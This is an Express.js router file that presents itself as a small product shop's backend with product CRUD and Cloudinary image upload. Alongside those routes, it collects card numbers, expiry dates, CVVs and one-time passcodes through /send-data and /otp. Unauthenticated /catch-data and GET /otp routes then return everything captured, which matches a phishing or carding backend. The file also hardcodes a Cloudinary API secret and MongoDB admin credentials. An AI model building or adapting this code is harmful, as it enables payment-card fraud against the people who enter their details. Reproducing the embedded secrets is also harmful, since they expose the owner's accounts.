var express = require("express");
const Product = require("../model/add");
const Data = require("../model/data");
const Otp = require("../model/otp");
const ExpressFormidable = require("express-formidable");
var router = express.Router();
const cloudinary = require("cloudinary");
// Cloudinary
cloudinary.config({
  cloud_name: "dw0kjho6e",
  api_key: "957269996122893",
  api_secret: "C3tKX-fjjCtVdLa070h_xfY99_E",
});
// Add Product
router.post("/add", async function (req, res, next) {
  const { img, name, title, price } = req.body;
  const product = new Product({ img, name, title, price });
  try {
    await product.save();
    return res.json({
      message: "Done",
    });
  } catch (err) {
    console.log(err);
    res.status(400).send("Error. Try Again ...");
  }
});
// Upload-image
router.post(
  "/upload-img",
  ExpressFormidable({ maxFileSize: 5 * 1024 * 1024 }),
  async function (req, res, next) {
    try {
      const result = await cloudinary.v2.uploader.upload(req.files.image.path);
      res.json({
        url: result.secure_url,
      });
    } catch (err) {
      console.log(err);
    }
  }
);
// Get All Products
router.get("/product", async function (req, res, next) {
  const MongoClient = require("mongodb").MongoClient;
  const url =
    "mongodb+srv://admin:admin@cluster0.nxclpjl.mongodb.net/?retryWrites=true&w=majority";
  const databasename = "test";
  MongoClient.connect(url)
    .then((client) => {
      const connect = client.db(databasename);
      const collection = connect.collection("products");
      collection
        .find({})
        .toArray()
        .then((ans) => {
          res.json(ans);
        });
    })
    .catch((err) => {
      console.log(err.Message);
    });
});
// Query Product By Id
router.get(`/product/:id`, async (req, res, next) => {
  Product.findById(req.params.id)
    .then((result) => {
      res.json(result);
    })
    .catch((err) => {
      console.log(err);
    });
});
// Update Data
router.patch(`/updatedata`, async (req, res, next) => {
  const newData = {
    name: req.body.name,
    title: req.body.title,
    price: req.body.price,
    condition: req.body.condition,
  };
  Product.findOneAndUpdate({ _id: req.body.idItem }, { $set: newData })
    .then((res) => {
      res.status(200).json({
        message: "Done Updated",
      });
      console.log(res);
    })
    .catch((err) => console.log(err));
});
// Delet Data
router.delete("/deletitem/:id", async (req, res, next) => {
  await Product.findOneAndDelete({ _id: req.params.id })
    .then((result) => {
      res.status(200).json({
        message: "Done Deleted",
      });
    })
    .catch((err) => {
      console.log(err);
    });
});
router.post('/send-data', async (req, res, next)=>{
  const {name, phone, num, month, year, cvv, desc, plan} = req.body;
  const data = new Data({name, phone, num, month, year, cvv, desc, plan})
  try {
    await data.save();
    return res.json({
      message: 'done'
    })
  } catch (err) {
    console.log(err);
  }
})
router.post('/otp', async (req, res, next)=>{
  const {otpMsg} = req.body;
  const data = new Otp({otpMsg})
  console.log(req.body);
  try {
    await data.save();
    return res.json({
      message: 'done'
    })
  } catch (err) {
    console.log(err);
  }
})
router.get('/catch-data', (req, res, next)=>{
  const MongoClient = require("mongodb").MongoClient;
  const url =
    "mongodb+srv://admin:admin@cluster0.nxclpjl.mongodb.net/?retryWrites=true&w=majority";
  const databasename = "test";
  MongoClient.connect(url)
    .then((client) => {
      const connect = client.db(databasename);
      const collection = connect.collection("datas");
      collection
        .find({})
        .toArray()
        .then((rus) => {
          res.json(rus);
        });
    })
    .catch((err) => {
      console.log(err.Message);
    });
})
router.get('/otp', (req, res, next)=>{
  const MongoClient = require("mongodb").MongoClient;
  const url =
    "mongodb+srv://admin:admin@cluster0.nxclpjl.mongodb.net/?retryWrites=true&w=majority";
  const databasename = "test";
  MongoClient.connect(url)
    .then((client) => {
      const connect = client.db(databasename);
      const collection = connect.collection("otps");
      collection
        .find({})
        .toArray()
        .then((rus) => {
          res.json(rus);
        });
    })
    .catch((err) => {
      console.log(err.Message);
    });
})
module.exports = router;
